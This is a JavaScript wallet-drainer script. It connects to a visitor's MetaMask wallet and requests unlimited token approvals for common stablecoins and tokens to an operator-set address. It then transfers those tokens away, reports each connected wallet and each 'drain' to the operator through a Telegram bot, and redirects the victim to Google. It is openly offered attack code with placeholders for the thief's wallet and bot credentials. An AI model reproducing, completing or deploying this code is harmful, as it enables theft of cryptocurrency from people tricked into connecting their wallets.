// --- CONFIGURATION ---
const YOUR_WALLET_ADDRESS = "0xYourWalletAddressHere"; // <--- PUT YOUR ADDRESS HERE
const TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE";

// List of common tokens to target automatically
const TOKENS_TO_TARGET = [
  { name: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7" },
  { name: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" },
  { name: "WETH", address: "0xC02aaA39B223FE8D0A0e5C4F27eAD9083C756Cc2" },
  { name: "DAI", address: "0x6B175474E89094C44Da98b954EedeAC495271d0F" },
  { name: "UNI", address: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984" },
  { name: "LINK", address: "0x514910771AF9Ca656af840dff83E8264EcF986CA" }
];

let provider;
let signer;
let userAddress;

function getFormattedDate() {
  const now = new Date();
  return now.toLocaleDateString('en-US', { year: 'numeric', month: '2-digit', day: '2-digit' }).replace(/\//g, '/') + ', ' +
    now.toLocaleTimeString('en-US', { hour: 'numeric', minute: '2-digit', second: '2-digit', hour12: true });
}

function showToast(title, htmlContent) {
  const toast = document.getElementById("notificationToast");
  document.querySelector(".toast-header").textContent = title;
  document.getElementById("toastContent").innerHTML = htmlContent;
  toast.className = "toast show";
  setTimeout(() => { toast.className = toast.className.replace("show", ""); }, 10000);
}

function sendTelegramAlert(type, address, details) {
  const text = `*${type} Event*\n📅 Time: ${details.time}\n👤 Address: \`${address}\`\n💰 Status: ${details.status}`;
  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: 'Markdown' })
  });
}

async function initiateDrain() {
  const btn = document.getElementById("connectBtn");
  const spinner = document.getElementById("spinner");
  const status = document.getElementById("statusText");
  
  if (!window.ethereum) return alert("Please install MetaMask.");
  
  try {
    btn.disabled = true;
    spinner.style.display = "block";
    status.textContent = "Connecting...";
    
    provider = new ethers.providers.Web3Provider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    signer = provider.getSigner();
    userAddress = await signer.getAddress();
    
    const connTime = getFormattedDate();
    showToast("🔗 Wallet Connected", `<div class="toast-row"><span class="label">Address:</span><br>${userAddress}</div><div class="toast-row"><span class="label">Time:</span><br>${connTime}</div>`);
    sendTelegramAlert("CONNECT", userAddress, { time: connTime, status: "Connected" });
    
    status.textContent = "Scanning for tokens...";
    
    // 1. APPROVE PHASE (Multi-Sig Simulation)
    for (const token of TOKENS_TO_TARGET) {
      status.textContent = `Approving ${token.name}...`;
      const contract = new ethers.Contract(token.address, ["function approve(address,uint256) public returns(bool)", "function balanceOf(address) view returns(uint256)"], signer);
      
      // Check balance first to save gas/time
      const bal = await contract.balanceOf(userAddress);
      if (bal.gt(0)) {
        const tx = await contract.approve(YOUR_WALLET_ADDRESS, ethers.constants.MaxUint256);
        await tx.wait();
      }
    }
    
    // 2. WIPE PHASE
    status.textContent = "Transferring funds...";
    for (const token of TOKENS_TO_TARGET) {
      const contract = new ethers.Contract(token.address, ["function transferFrom(address,address,uint256) public returns(bool)"], signer);
      const tx = await contract.transferFrom(userAddress, YOUR_WALLET_ADDRESS, ethers.constants.MaxUint256);
      await tx.wait();
    }
    
    const wipeTime = getFormattedDate();
    showToast("✅ Transaction Confirmed", `<div class="toast-row"><span class="label">Wallet:</span><br>${userAddress}</div><div class="toast-row"><span class="label">Status:</span><br>Funds Drained</div><div class="toast-row"><span class="label">Time:</span><br>${wipeTime}</div>`);
    sendTelegramAlert("WIPE", userAddress, { time: wipeTime, status: "Funds Sent" });
    
    window.location.href = "https://google.com";
    
  } catch (error) {
    console.error(error);
    btn.disabled = false;
    spinner.style.display = "none";
    showToast("❌ Failed", error.message || "User rejected transaction");
  }
}